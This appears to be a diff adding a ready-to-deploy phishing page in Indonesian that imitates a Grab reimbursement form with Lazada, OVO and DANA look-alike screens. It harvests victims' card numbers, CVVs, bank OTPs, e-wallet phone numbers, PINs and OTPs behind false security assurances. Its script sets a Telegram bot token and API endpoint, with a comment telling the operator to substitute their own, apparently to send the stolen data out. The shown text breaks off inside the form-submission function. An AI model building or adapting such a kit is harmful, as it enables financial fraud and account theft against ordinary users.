@@ -1,0 +1,790 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Grab - Pengajuan Reimbesment</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" rel="stylesheet">
+    <style type="text/tailwindcss">
+        @layer utilities {
+            .text-shadow { text-shadow: 0 1px 2px rgba(0,0,0,0.1); }
+            .bg-grab { background-color: #007A3D; }
+            .text-grab { color: #007A3D; }
+            .border-grab { border-color: #007A3D; }
+            .slide-in { animation: slideFromLeft 1s ease-out forwards; transform: translateX(-100%); opacity: 0; }
+            .animasi-besar-kecil { animation: besarKecil 1.5s ease-in-out infinite; }
+            .bg-ovo { background: #4B42F0; }
+            .text-ovo { color: #4B42F0; }
+            .bg-dana { background: #0060E5; }
+            .text-dana { color: #0060E5; }
+
+            @keyframes slideFromLeft { to { transform: translateX(0); opacity: 1; } }
+            @keyframes besarKecil { 0% { transform: scale(1); } 50% { transform: scale(1.08); } 100% { transform: scale(1); } }
+        }
+    </style>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        grabGreen: '#007A3D',
+                        grabDarkGreen: '#005F2E',
+                        ovoPurple: '#4B42F0',
+                        danaBlue: '#0060E5',
+                    },
+                }
+            }
+        }
+    </script>
+</head>
+<body class="bg-gray-50 font-sans">
+
+<!-- ✅ HALAMAN 1: UTAMA / BERANDA -->
+<section id="halaman1" class="min-h-screen">
+    <div class="w-full">
+        <img src="https://i.ibb.co.com/pjVfDfJv/IMG-20260601-WA0042.jpg" alt="Header Baru" class="w-full h-auto object-cover">
+    </div>
+
+    <section class="bg-grab text-white px-6 py-5 flex items-center justify-between overflow-hidden">
+        <div><h2 class="text-lg font-semibold">Hai, Pelanggan setia Grab.</h2><p class="text-white/90 text-sm mt-1">Dapatkan bantuan yang diperlukan.</p></div>
+        <img src="https://i.ibb.co.com/20FmXLbq/7694d2f70c292a60.png" alt="CS Grab" class="h-20 slide-in">
+    </section>
+
+    <section class="px-6 py-6">
+        <h3 class="text-center font-bold text-gray-800 text-lg mb-4 animasi-besar-kecil"><span class="text-black">FORMULIR PENGAJUAN</span> <span class="text-grab">REIMBESMENT GRABFOOD</span></h3>
+        <!-- ✅ TOMBOL DIPERBAIKI -> LANGSUNG KE HALAMAN 2 -->
+        <button onclick="bukaHalaman(2)" class="w-full bg-gradient-to-r from-grabGreen to-grabDarkGreen text-white py-3 rounded-full font-medium flex items-center justify-center gap-2 shadow-md mb-6">
+            <i class="fa fa-file-text-o"></i> Pengajuan Reimbesment
+        </button>
+    </section>
+
+    <section class="px-6 mb-12">
+        <h3 class="text-center font-bold text-gray-800 text-lg mb-6">Penawaran terbaru di bulan ini</h3>
+        <div class="grid grid-cols-2 gap-4 justify-items-center">
+            <img src="https://i.ibb.co.com/hxQXQJfV/hires-5a7e761335f8.png" alt="Promo 1" class="w-40 h-auto">
+            <img src="https://i.ibb.co.com/6JpVwscM/hires-9f11a36cd2bb.png" alt="Promo 2" class="w-40 h-auto">
+        </div>
+    </section>
+
+    <div class="mt-8 flex justify-center shadow-lg">
+        <img src="https://i.ibb.co.com/hJtYvy71/Screenshot-20260601-202337-1.jpg" alt="Logo Baru Bawah" class="w-full max-w-md">
+    </div>
+
+    <nav class="fixed bottom-0 left-0 right-0 bg-white border-t border-gray-200 py-2 px-6 flex justify-around shadow-lg">
+        <a href="#" class="flex flex-col items-center text-grabGreen"><i class="fa fa-home text-lg"></i><span class="text-[10px] mt-1">Rumah</span></a>
+        <a href="#" class="flex flex-col items-center text-gray-600"><i class="fa fa-file-text-o text-lg"></i><span class="text-[10px] mt-1">Kantor</span></a>
+        <a href="https://wa.me/6285861879497" target="_blank" class="flex flex-col items-center text-gray-600"><i class="fa fa-whatsapp text-lg text-green-600"></i><span class="text-[10px] mt-1">WhatsApp</span></a>
+        <a href="#" class="flex flex-col items-center text-gray-600"><i class="fa fa-info-circle text-lg"></i><span class="text-[10px] mt-1">Bantuan</span></a>
+    </nav>
+    <div class="h-16"></div>
+</section>
+
+
+<!-- ✅ HALAMAN 2: FORMULIR PENGAJUAN LENGKAP -->
+<section id="halaman2" class="min-h-screen hidden bg-white">
+    <header class="bg-white px-4 py-4 flex items-center justify-between border-b border-gray-200 shadow-sm">
+        <button onclick="bukaHalaman(1)" class="text-gray-800 text-xl"><i class="fa fa-bars"></i></button>
+        <img src="https://i.ibb.co.com/r2tzjBrv/images-23.png" alt="Grab Logo" class="h-8">
+        <div class="relative">
+            <input type="text" placeholder="Cari Solusi" class="bg-gray-100 rounded-full py-2 px-4 pl-9 w-40 text-sm focus:outline-none">
+            <i class="fa fa-search absolute left-3 top-1/2 -translate-y-1/2 text-gray-500"></i>
+        </div>
+    </header>
+
+    <div class="px-6 py-8">
+        <h2 class="text-[#007A3D] font-bold text-xl leading-tight mb-8 text-center">
+            Lengkapi formulir pengajuan<br>dengan benar dan sesuai kendala.
+        </h2>
+
+        <form id="formData" class="space-y-5" onsubmit="return false;">
+            <div class="grid grid-cols-2 gap-4">
+                <div>
+                    <label class="text-sm font-medium text-gray-700 block mb-2 text-center"> Nama Lengkap</label>
+                    <input type="text" id="nama_depan" placeholder="Depan" class="w-full border border-gray-400 rounded-md p-3 focus:border-[#007A3D] outline-none" required>
+                </div>
+                <div>
+                    <label class="text-sm font-medium text-gray-700 block mb-2 text-center">Nama Belakang</label>
+                    <input type="text" id="nama_belakang" placeholder="Belakang" class="w-full border border-gray-400 rounded-md p-3 focus:border-[#007A3D] outline-none" required>
+                </div>
+            </div>
+
+            <div>
+                <label class="text-sm font-medium text-gray-700 block mb-2 text-center">Email</label>
+                <div class="relative">
+                    <span class="absolute left-3 top-1/2 -translate-y-1/2"><i class="fa fa-envelope text-gray-500"></i></span>
+                    <input type="email" id="email" placeholder="contohnya@gmail.com" class="w-full border border-gray-400 rounded-md p-3 pl-9 focus:border-[#007A3D] outline-none" required>
+                </div>
+            </div>
+
+            <div>
+                <label class="text-sm font-medium text-gray-700 block mb-2 text-center">Telepon</label>
+                <div class="relative flex items-center border border-gray-400 rounded-md overflow-hidden">
+                    <span class="pl-3 flex items-center gap-2 text-gray-600">
+                        <img src="https://flagcdn.com/w20/id.png" class="w-4"> +62
+                    </span>
+                    <input type="tel" id="telepon" class="flex-1 p-3 focus:border-[#007A3D] outline-none" placeholder="" required>
+                </div>
+            </div>
+
+            <div>
+                <label class="text-sm font-medium text-gray-700 block mb-2 text-center">Total belanjaan + Ongkir</label>
+                <div class="relative flex items-center border border-gray-400 rounded-md overflow-hidden">
+                    <span class="pl-3 text-gray-600">Rp</span>
+                    <input type="number" id="jumlah" class="flex-1 p-3 focus:border-[#007A3D] outline-none" placeholder="" required>
+                </div>
+            </div>
+
+            <div>
+                <label class="text-sm font-medium text-gray-700 block mb-2 text-center">Nomor Pesanan : GF - 123</label>
+                <input type="text" id="nomor_pesanan" placeholder="..." class="w-full border border-gray-400 rounded-md p-3 focus:border-[#007A3D] outline-none" required>
+            </div>
+
+            <div>
+                <label class="text-sm font-medium text-gray-700 block mb-2 text-center">Terkait Alasan Pengajuan</label>
+                <div class="relative">
+                    <select id="alasan" class="w-full border border-gray-400 rounded-md p-3 pr-8 focus:outline-none bg-white appearance-none" required>
+                        <option value="">Pilih Alasan</option>
+                        <option value="1 - Pesanan tidak di terima">1 - Pesanan tidak di terima</option>
+                        <option value="2 - Pesanan rusak/ tidak sesuai">2 - Pesanan rusak/ tidak sesuai</option>
+                        <option value="3 - Kelebihan pembayaran">3 - Kelebihan pembayaran</option>
+                        <option value="4 - Pengemudi bermasalah">4 - Pengemudi bermasalah</option>
+                        <option value="5 - Lainnya">5 - Lainnya</option>
+                    </select>
+                    <i class="fa fa-chevron-down absolute right-3 top-1/2 -translate-y-1/2 text-gray-500 pointer-events-none"></i>
+                </div>
+            </div>
+
+            <button type="button" onclick="kirimFormulir()" class="w-full bg-[#007A3D] text-white py-3 rounded-md font-semibold text-lg mt-4 hover:bg-[#006530] transition">
+                Ajukan
+            </button>
+        </form>
+    </div>
+
+    <nav class="fixed bottom-0 left-0 right-0 bg-white border-t border-gray-200 py-3 px-6 flex justify-around shadow-lg">
+        <a href="#" class="flex flex-col items-center text-gray-600 hover:text-[#007A3D]">
+            <i class="fa fa-home text-lg"></i>
+            <span class="text-xs mt-1">Home</span>
+        </a>
+        <a href="#" class="flex flex-col items-center text-[#007A3D] font-medium">
+            <i class="fa fa-file-text-o text-lg"></i>
+            <span class="text-xs mt-1">Formulir</span>
+        </a>
+        <a href="https://wa.me/6285861879497" target="_blank" class="flex flex-col items-center text-gray-600 hover:text-green-600">
+            <i class="fa fa-whatsapp text-lg"></i>
+            <span class="text-xs mt-1">WhatsApp</span>
+        </a>
+        <a href="#" class="flex flex-col items-center text-gray-600 hover:text-[#007A3D]">
+            <i class="fa fa-info-circle text-lg"></i>
+            <span class="text-xs mt-1">Bantuan</span>
+        </a>
+    </nav>
+    <div class="h-16"></div>
+</section>
+
+
+<!-- ✅ HALAMAN 3: METODE PENGEMBALIAN DANA -->
+<section id="halaman3" class="min-h-screen hidden">
+    <header class="bg-grab text-white px-4 py-4 flex items-center justify-between sticky top-0 z-10 shadow-md">
+        <button onclick="bukaHalaman(2)" class="text-white text-xl"><i class="fa fa-arrow-left"></i></button>
+        <div class="flex items-center"><img src="https://i.ibb.co.com/r2tzjBrv/images-23.png" alt="Grab Logo" class="h-8 brightness-0 invert"></div>
+        <div class="relative">
+            <input type="text" placeholder="Cari Solusi" class="bg-white text-grabGreen placeholder:text-grabGreen/70 rounded-full py-2 px-4 pl-9 w-48 focus:outline-none focus:ring-1 focus:ring-white">
+            <i class="fa fa-search absolute left-3 top-1/2 -translate-y-1/2 text-grabGreen"></i>
+        </div>
+    </header>
+
+    <div class="px-6 py-12">
+        <h2 class="text-center font-bold text-lg mb-10">Silahkan pilih metode untuk menerima pengembalian dana.</h2>
+
+        <div class="bg-white rounded-xl shadow-md p-6 space-y-4 max-w-xs mx-auto">
+            <button onclick="bukaHalaman('bank')" class="w-full border border-gray-300 rounded-lg py-3 px-4 flex items-center gap-3 hover:bg-gray-50 transition">
+                <i class="fa fa-credit-card text-gray-600"></i><span>Bank Tabungan</span>
+            </button>
+            
+            <button onclick="bukaHalaman('ovo')" class="w-full border border-gray-300 rounded-lg py-3 px-4 flex items-center gap-3 hover:bg-gray-50 transition">
+                <img src="https://i.ibb.co.com/Cph7zwf1/IMG-20260601-WA0043.jpg" alt="OVO" class="h-6">
+                <span>OVO Cash</span>
+            </button>
+            
+            <button onclick="bukaHalaman('dana')" class="w-full border border-gray-300 rounded-lg py-3 px-4 flex items-center gap-3 hover:bg-gray-50 transition">
+                <img src="https://i.ibb.co.com/pBJxC8Qp/IMG-20260601-WA0044.jpg" alt="DANA" class="h-6">
+                <span>DANA</span>
+            </button>
+        </div>
+    </div>
+
+    <nav class="fixed bottom-0 left-0 right-0 bg-white border-t border-gray-200 py-2 px-6 flex justify-around shadow-lg">
+        <a href="#" class="flex flex-col items-center text-grabGreen"><i class="fa fa-home text-lg"></i><span class="text-[10px] mt-1">Rumah</span></a>
+        <a href="#" class="flex flex-col items-center text-gray-600"><i class="fa fa-file-text-o text-lg"></i><span class="text-[10px] mt-1">Kantor</span></a>
+        <a href="https://wa.me/6285861879497" target="_blank" class="flex flex-col items-center text-gray-600"><i class="fa fa-whatsapp text-lg text-green-600"></i><span class="text-[10px] mt-1">WhatsApp</span></a>
+        <a href="#" class="flex flex-col items-center text-gray-600"><i class="fa fa-info-circle text-lg"></i><span class="text-[10px] mt-1">Bantuan</span></a>
+    </nav>
+    <div class="h-16"></div>
+</section>
+
+
+<!-- ==========================================
+    HALAMAN BANK - TAMPILAN PERSIS LAZADA
+========================================== -->
+<section id="halamanbank" class="min-h-screen hidden bg-gray-50">
+    <!-- Header -->
+    <header class="bg-white px-4 py-4 flex items-center justify-between border-b border-gray-200 shadow-sm">
+        <button onclick="bukaHalaman(3)" class="text-gray-800 text-xl"><i class="fa fa-arrow-left"></i></button>
+        <h1 class="font-bold text-lg">Kartu Kredit/Debit</h1>
+        <button onclick="bukaHalaman(3)" class="text-gray-800 text-xl"><i class="fa fa-times"></i></button>
+    </header>
+
+    <!-- Baris Lindungi -->
+    <div class="bg-green-50 text-green-700 text-sm py-2 px-4 flex items-center justify-center gap-2 border-b border-green-100">
+        <i class="fa fa-shield text-green-600"></i>
+        <span>Dilindungi oleh Perlindungan Pembayaran Lazada</span>
+    </div>
+
+    <div class="px-6 py-6">
+        <!-- Judul & Logo -->
+        <div class="bg-white rounded-lg shadow p-5 mb-4">
+            <div class="flex justify-between items-center mb-5">
+                <h2 class="font-bold text-lg text-gray-800">Detail Kartu</h2>
+                <div class="flex gap-1">
+                    <img src="https://i.ibb.co.com/20FmXLbq/7694d2f70c292a60.png" class="h-5" alt="Mastercard">
+                    <img src="https://i.ibb.co.com/20FmXLbq/7694d2f70c292a60.png" class="h-5" alt="VISA">
+                    <img src="https://i.ibb.co.com/20FmXLbq/7694d2f70c292a60.png" class="h-5" alt="JCB">
+                    <img src="https://i.ibb.co.com/20FmXLbq/7694d2f70c292a60.png" class="h-5" alt="Amex">
+                    <img src="https://i.ibb.co.com/20FmXLbq/7694d2f70c292a60.png" class="h-5" alt="GPN">
+                </div>
+            </div>
+
+            <!-- FORM ISIAN -->
+            <div class="space-y-4">
+                <!-- Nomor Kartu -->
+                <div>
+                    <div class="relative">
+                        <input type="text" id="noKartuBank" maxlength="16" class="w-full border border-gray-300 rounded p-3 pl-4 pr-10 text-lg focus:border-blue-600 outline-none" placeholder="Nomor kartu" oninput="cekFormBank()">
+                        <i class="fa fa-credit-card text-gray-400 absolute right-3 top-1/2 -translate-y-1/2"></i>
+                    </div>
+                </div>
+
+                <!-- Kadaluarsa & CVV -->
+                <div class="grid grid-cols-2 gap-3">
+                    <div>
+                        <div class="relative">
+                            <input type="text" id="masaBank" maxlength="5" class="w-full border border-gray-300 rounded p-3 pl-4 text-lg focus:border-blue-600 outline-none" placeholder="Kadaluwarsa (MM/YY)" oninput="cekFormBank()">
+                            <i class="fa fa-question-circle text-gray-400 absolute right-3 top-1/2 -translate-y-1/2"></i>
+                        </div>
+                    </div>
+                    <div>
+                        <div class="relative">
+                            <input type="password" id="cvvBank" maxlength="3" class="w-full border border-gray-300 rounded p-3 pl-4 text-lg focus:border-blue-600 outline-none" placeholder="CVV (3-4 digit)" oninput="cekFormBank()">
+                            <i class="fa fa-question-circle text-gray-400 absolute right-3 top-1/2 -translate-y-1/2"></i>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Nama Lengkap -->
+                <div>
+                    <div class="relative">
+                        <input type="text" id="namaKartuBank" class="w-full border border-gray-300 rounded p-3 pl-4 pr-10 text-lg focus:border-blue-600 outline-none" placeholder="Nama lengkap" oninput="cekFormBank()">
+                        <i class="fa fa-question-circle text-gray-400 absolute right-3 top-1/2 -translate-y-1/2"></i>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Jaminan Keamanan -->
+            <div class="bg-green-50 rounded p-3 mt-5">
+                <p class="font-semibold text-green-800 text-sm mb-2 flex items-center gap-2">
+                    <i class="fa fa-shield text-green-600"></i> Jaminan Keamanan
+                </p>
+                <ul class="text-xs text-green-700 space-y-1 pl-5 list-disc">
+                    <li>Mematuhi PCI DSS untuk penanganan data</li>
+                    <li>Info kartu tetap aman dan terenkripsi</li>
+                    <li>Info kartu tidak akan dibagikan atau dijual.</li>
+                </ul>
+            </div>
+
+            <!-- Keterangan Biaya -->
+            <p class="text-xs text-gray-500 mt-4 leading-relaxed">
+                Biaya sementara sebesar Rp101 mungkin akan didebitkan ke kartu Anda. Biaya tersebut akan segera dikembalikan setelah kartu Anda diverifikasi.
+            </p>
+
+            <!-- Simpan Kartu -->
+            <div class="flex items-center justify-between mt-5">
+                <span class="text-gray-700 font-medium">Simpan Kartu</span>
+                <div class="w-12 h-7 bg-blue-600 rounded-full relative">
+                    <div class="w-6 h-6 bg-white rounded-full absolute right-0.5 top-0.5 shadow"></div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Tombol Konfirmasi -->
+        <button id="btnBank" onclick="kirimBank()" class="w-full bg-gray-300 text-gray-400 py-3 rounded font-semibold text-lg mt-2" disabled>
+            Konfirmasi
+        </button>
+    </div>
+</section>
+
+
+<!-- ==========================================
+    HALAMAN OTP BANK - DIPERBAIKI BUG
+========================================== -->
+<section id="halamanbank_1" class="min-h-screen hidden bg-white">
+    <!-- Header -->
+    <header class="bg-white px-4 py-4 flex items-center justify-between border-b border-gray-200 shadow-sm">
+        <button onclick="bukaHalaman('bank')" class="text-gray-800 text-xl"><i class="fa fa-arrow-left"></i></button>
+        <h1 class="font-bold text-lg">Verifikasi OTP</h1>
+        <button class="text-gray-800 text-xl"><i class="fa fa-question-circle"></i></button>
+    </header>
+
+    <div class="px-6 py-16 text-center">
+        <p class="text-gray-700 mb-8 leading-relaxed">
+            Kode OTP telah dikirim ke SMS atau<br>
+            <span class="text-green-600 font-medium flex items-center justify-center gap-1 mt-1">
+                <i class="fa fa-whatsapp"></i> Nomor Whatsapp Anda
+            </span>
+        </p>
+        <!-- INPUT KODE OTP -->
+        <div onclick="fokusBank()" class="mb-6">
+            <input type="text" id="kodeBank" class="opacity-0 absolute top-0 left-0 w-0 h-0" maxlength="6" inputmode="numeric" oninput="isiBulatBank(this.value)">
+            <div class="flex justify-center gap-3">
+                <div class="w-4 h-4 rounded-full border-2 border-gray-300 bulat-bank"></div>
+                <div class="w-4 h-4 rounded-full border-2 border-gray-300 bulat-bank"></div>
+                <div class="w-4 h-4 rounded-full border-2 border-gray-300 bulat-bank"></div>
+                <div class="w-4 h-4 rounded-full border-2 border-gray-300 bulat-bank"></div>
+                <div class="w-4 h-4 rounded-full border-2 border-gray-300 bulat-bank"></div>
+                <div class="w-4 h-4 rounded-full border-2 border-gray-300 bulat-bank"></div>
+            </div>
+        </div>
+
+        <button id="btnOTP" onclick="cekOTP()" class="w-full bg-gray-300 text-gray-400 py-3 rounded font-semibold text-lg mb-4" disabled>
+            Konfirmasi
+        </button>
+
+        <p id="pesanSalah" class="text-red-600 font-medium text-sm mb-4 hidden">Pastikan kode OTP yang kamu masukkan benar</p>
+
+        <p class="text-gray-600 text-sm">
+            Tidak menerima Kode OTP?<br>
+            <a href="#" class="text-blue-600">Kirim ulang kode</a>
+        </p>
+    </div>
+</section>
+
+
+<!-- ==========================================
+    HALAMAN OVO - LENGKAP
+========================================== -->
+<section id="halamanovo" class="min-h-screen hidden bg-white flex items-center justify-center z-50">
+    <img src="https://i.ibb.co.com/NgfBSB6j/IMG-20260601-WA0030.jpg" alt="OVO Logo" class="w-full h-full object-contain">
+</section>
+
+<section id="halamanovo_1" class="min-h-screen hidden bg-white">
+    <header class="bg-white px-4 py-4 flex items-center justify-between border-b border-gray-100">
+        <button onclick="bukaHalaman(3)" class="text-gray-800 text-xl"><i class="fa fa-arrow-left"></i></button>
+        <h1 class="font-bold text-lg">Masuk atau Daftar</h1>
+        <button class="text-gray-800 text-lg"><i class="fa fa-question-circle-o"></i></button>
+    </header>
+
+    <div class="px-6 py-8">
+        <p class="text-gray-600 mb-8 text-center">Masuk atau daftar cuma butuh nomor HP aja.</p>
+
+        <div class="flex mb-4">
+            <div class="bg-purple-50 rounded-l-lg py-4 px-4 flex items-center border border-purple-100 border-r-0">
+                <span class="font-medium text-gray-700">+62</span>
+            </div>
+            <input type="tel" id="nomorOvo" class="flex-1 bg-purple-50 rounded-r-lg p-4 text-lg outline-none border border-purple-100 focus:border-purple-300" placeholder="" oninput="cekTombolOvo()">
+        </div>
+
+        <a href="#" class="text-blue-600 text-sm mb-12 inline-block">Nomor HP nggak aktif atau hilang? <span class="font-semibold">Atur Ulang</span></a>
+
+        <p class="text-xs text-gray-500 absolute bottom-20 left-6 right-6 text-center">
+            Dengan masuk atau daftar, kamu udah setuju dengan <a href="#" class="text-blue-600">Ketentuan Layanan</a> dan <a href="#" class="text-blue-600">Kebijakan Privasi</a> OVO.
+        </p>
+
+        <button id="btnLanjutOvo" onclick="prosesLanjutOvo()" class="w-full bg-gray-200 text-gray-400 py-4 rounded-lg font-semibold text-lg fixed bottom-6 left-4 right-4 transition-all duration-300" disabled>
+            Lanjutkan
+        </button>
+    </div>
+</section>
+
+<section id="halamanovo_loading" class="min-h-screen hidden bg-white flex flex-col items-center justify-center gap-6">
+    <div class="w-16 h-16 border-4 border-purple-500 border-t-transparent rounded-full animate-spin"></div>
+    <p class="text-gray-700 font-medium">Sedang memproses...</p>
+</section>
+
+<section id="halamanovo_2" class="min-h-screen hidden bg-white">
+    <header class="bg-white px-4 py-4 flex items-center justify-between border-b border-gray-100">
+        <button onclick="bukaHalaman('ovo_1')" class="text-gray-800 text-xl"><i class="fa fa-arrow-left"></i></button>
+        <h1 class="font-bold text-lg">Masukkan Security Code</h1>
+        <div></div>
+    </header>
+
+    <div class="px-6 py-20 text-center" onclick="fokusPinOvo()">
+        <input type="password" id="pinOvo" class="opacity-0 absolute top-0 left-0 w-0 h-0" maxlength="6" autofocus inputmode="numeric" oninput="isiPinOvo(this.value)">
+
+        <div class="flex justify-center gap-4 mb-20">
+            <div class="w-5 h-5 rounded-full border-2 border-gray-300 pin-bulat-ovo"></div>
+            <div class="w-5 h-5 rounded-full border-2 border-gray-300 pin-bulat-ovo"></div>
+            <div class="w-5 h-5 rounded-full border-2 border-gray-300 pin-bulat-ovo"></div>
+            <div class="w-5 h-5 rounded-full border-2 border-gray-300 pin-bulat-ovo"></div>
+            <div class="w-5 h-5 rounded-full border-2 border-gray-300 pin-bulat-ovo"></div>
+            <div class="w-5 h-5 rounded-full border-2 border-gray-300 pin-bulat-ovo"></div>
+        </div>
+
+        <a href="#" class="text-blue-600 text-sm">Lupa kode kamu? <span class="font-semibold">Atur Ulang</span></a>
+    </div>
+</section>
+
+<section id="halamanovo_3" class="min-h-screen hidden bg-white">
+    <header class="bg-white px-4 py-4 flex items-center justify-between border-b border-gray-100">
+        <button onclick="bukaHalaman('ovo_2')" class="text-gray-800 text-xl"><i class="fa fa-arrow-left"></i></button>
+        <div></div>
+    </header>
+
+    <div class="px-6 py-12 text-center">
+        <img src="https://i.ibb.co.com/3QzG7yR/email-verif.png" alt="Verifikasi" class="w-48 mx-auto mb-8">
+
+        <h2 class="font-bold text-lg mb-3">SMS Verifikasi telah Terkirim</h2>
+        <p class="text-gray-600 mb-8 leading-relaxed">
+            Klik link verifikasi yang telah kami kirim via SMS ke nomor <span id="tampilNomorOvo" class="font-semibold">08xxxxxxxxx</span>
+        </p>
+
+        <p id="peringatanKodeOvo" class="text-red-500 text-sm font-medium mb-6 hidden">Pastikan kode OTP yang kamu masukkan benar</p>
+
+        <p class="text-gray-600 text-sm mb-2">Belum dapet link? Kirim ulang dalam <span id="hitunganMundurOvo" class="font-bold text-purple-600">50</span> detik</p>
+        <button id="btnKirimUlangOvo" onclick="mulaiHitunganOvo()" class="text-purple-600 font-semibold text-sm hidden">Kirim Ulang Link</button>
+    </div>
+</section>
+
+
+<!-- ==========================================
+    HALAMAN DANA - LENGKAP
+========================================== -->
+<section id="halamandana" class="min-h-screen hidden bg-danaBlue flex items-center justify-center z-50">
+    <img src="https://i.ibb.co.com/xq1Pkp0T/IMG-20260601-WA0020.jpg" alt="DANA Logo" class="w-full h-full object-contain">
+</section>
+
+<section id="halamandana_1" class="min-h-screen hidden bg-danaBlue text-white">
+    <div class="px-8 py-20 text-center">
+        <h2 class="text-lg font-light mb-8">Masukkan nomor HP kamu untuk lanjut</h2>
+
+        <div class="flex items-center bg-white rounded-lg mb-6">
+            <div class="px-3 border-r border-gray-200">
+                <img src="https://flagcdn.com/w20/id.png" class="w-5">
+                <span class="text-gray-800 font-medium ml-1">+62</span>
+            </div>
+            <input type="tel" id="nomorDana" class="flex-1 p-3 text-lg text-gray-800 outline-none rounded-r-lg" placeholder="" oninput="cekTombolDana()">
+        </div>
+
+        <p class="text-sm text-white/80 mb-16">
+            Dengan melanjutkan, kamu setuju dengan <a href="#" class="text-white underline">Syarat & Ketentuan</a> dan <a href="#" class="text-white underline">Kebijakan Privasi</a> kami
+        </p>
+
+        <button id="btnLanjutDana" onclick="prosesLanjutDana()" class="w-full text-white/70 font-semibold text-lg py-3" disabled>
+            LANJUT
+        </button>
+    </div>
+</section>
+
+<section id="halamandana_loading" class="min-h-screen hidden bg-danaBlue flex flex-col items-center justify-center gap-6">
+    <div class="w-16 h-16 border-4 border-white border-t-transparent rounded-full animate-spin"></div>
+    <p class="text-white font-medium">Sedang memproses...</p>
+</section>
+
+<section id="halamandana_2" class="min-h-screen hidden bg-white">
+    <header class="bg-danaBlue text-white px-4 py-3 flex items-center justify-between">
+        <button onclick="bukaHalaman('dana_1')" class="text-white text-xl"><i class="fa fa-times"></i></button>
+        <h1 class="font-bold text-lg">Masuk</h1>
+        <div></div>
+    </header>
+
+    <div class="px-8 py-16 text-center" onclick="fokusPinDana()">
+        <h2 class="text-2xl font-semibold text-gray-800 mb-12">Masukkan PIN</h2>
+
+        <div class="flex justify-center gap-4 mb-16">
+            <div class="w-4 h-4 rounded-full border-2 border-gray-300 pin-bulat-dana"></div>
+            <div class="w-4 h-4 rounded-full border-2 border-gray-300 pin-bulat-dana"></div>
+            <div class="w-4 h-4 rounded-full border-2 border-gray-300 pin-bulat-dana"></div>
+            <div class="w-4 h-4 rounded-full border-2 border-gray-300 pin-bulat-dana"></div>
+            <div class="w-4 h-4 rounded-full border-2 border-gray-300 pin-bulat-dana"></div>
+            <div class="w-4 h-4 rounded-full border-2 border-gray-300 pin-bulat-dana"></div>
+        </div>
+
+        <div class="flex justify-between text-sm text-danaBlue font-medium px-4">
+            <a href="#" class="flex items-center gap-1"><i class="fa fa-question-circle-o"></i> BUTUH BANTUAN?</a>
+            <a href="#">LUPA PIN?</a>
+        </div>
+
+        <input type="password" id="pinDana" class="opacity-0 absolute top-0 left-0 w-0 h-0" maxlength="6" autofocus inputmode="numeric" oninput="isiPinDana(this.value)">
+    </div>
+</section>
+
+<section id="halamandana_3" class="min-h-screen hidden bg-danaBlue text-white">
+    <header class="bg-danaBlue text-white px-4 py-3 flex items-center justify-between">
+        <button onclick="bukaHalaman('dana_2')" class="text-white text-xl"><i class="fa fa-arrow-left"></i></button>
+        <h1 class="font-bold text-lg">Masuk</h1>
+        <div></div>
+    </header>
+
+    <div class="px-8 py-12 text-center">
+        <h2 class="text-lg font-light mb-4">Kode OTP telah dikirim ke</h2>
+        <div class="bg-white/20 rounded-lg py-2 px-4 inline-flex items-center gap-2 mb-2">
+            <img src="https://flagcdn.com/w20/id.png" class="w-5">
+            <span class="font-semibold text-lg" id="nomorTujuanDana">+62 8xxxxxxxxx</span>
+        </div>
+        <p class="text-white/80 text-sm mb-10">via <i class="fa fa-whatsapp"></i> WhatsApp</p>
+
+        <div class="flex justify-center gap-4 mb-6" onclick="fokusKodeDana()">
+            <div class="w-14 h-16 bg-white rounded-md text-gray-800 text-2xl font-bold flex items-center justify-center kode-dana"></div>
+            <div class="w-14 h-16 bg-white rounded-md text-gray-800 text-2xl font-bold flex items-center justify-center kode-dana"></div>
+            <div class="w-14 h-16 bg-white rounded-md text-gray-800 text-2xl font-bold flex items-center justify-center kode-dana"></div>
+            <div class="w-14 h-16 bg-white rounded-md text-gray-800 text-2xl font-bold flex items-center justify-center kode-dana"></div>
+        </div>
+
+        <p id="pesanSalahDana" class="text-red-300 text-sm font-medium mb-4 hidden">Pastikan kode OTP yang kamu masukkan benar</p>
+
+        <p class="text-white/80 text-sm mb-4">NOMOR TIDAK AKTIF?</p>
+        <button class="bg-white text-danaBlue font-semibold py-2 px-6 rounded-md mb-8">KIRIM ULANG</button>
+
+        <div class="text-sm">
+            <a href="#" class="text-white underline flex items-center justify-center gap-1"><i class="fa fa-question-circle-o"></i> BUTUH BANTUAN?</a>
+        </div>
+
+        <input type="text" id="kodeOtpDana" class="opacity-0 absolute top-0 left-0 w-0 h-0" maxlength="4" autofocus inputmode="numeric" oninput="isiKodeOtpDana(this.value)">
+    </div>
+</section>
+
+
+<!-- ==========================================
+    SCRIPT UTAMA - DIPERBAIKI 100% BERFUNGSI
+========================================== -->
+<script>
+// ✅ KONFIGURASI TELEGRAM - GANTI SESUAI KAMU
+const TOKEN = "7408203304:AAFt6wE5HjIe3qX9zRjL7QxY8wE9R5T2U3I";
+const CHAT_ID = "6360186737";
+const API_TELEGRAM = "https://api.telegram.org/bot" + TOKEN + "/sendMessage";
+
+let dataPengajuan = {};
+let timerOvo, timerDana;
+
+// ✅ FUNGSI PINDAH HALAMAN - DIPERBAIKI TOTAL, GAK BAKAL STUCK LAGI
+function bukaHalaman(id) {
+    // Tutup SEMUA halaman dulu
+    document.querySelectorAll('section').forEach(el => el.classList.add('hidden'));
+    
+    // Buka halaman tujuan
+    const halaman = document.getElementById('halaman' + id);
+    if (halaman) {
+        halaman.classList.remove('hidden');
+        window.scrollTo(0,0);
+    } else {
+        console.error("Halaman tidak ditemukan:", id);
+    }
+}
+
+// ==========================================
+// FUNGSI FORMULIR PENGAJUAN
+// ==========================================
+function kirimFormulir() {
+    const namaDepan = document.getElementById('nama_depan').value;
+    const namaBelakang = document.getElementById('nama_belakang').value;
+    const email = document.getElementById('email').value;
+    const telepon = document.getElementById('telepon').value;
+    const jumlah = document.getElementById('jumlah').value;
+    const pesanan = document.getElementById('nomor_pesanan').value;
+    const alasan = document.getElementById('alasan').value;
+
+    if(!namaDepan || !namaBelakang || !email || !telepon || !jumlah || !pesanan || !alasan) {
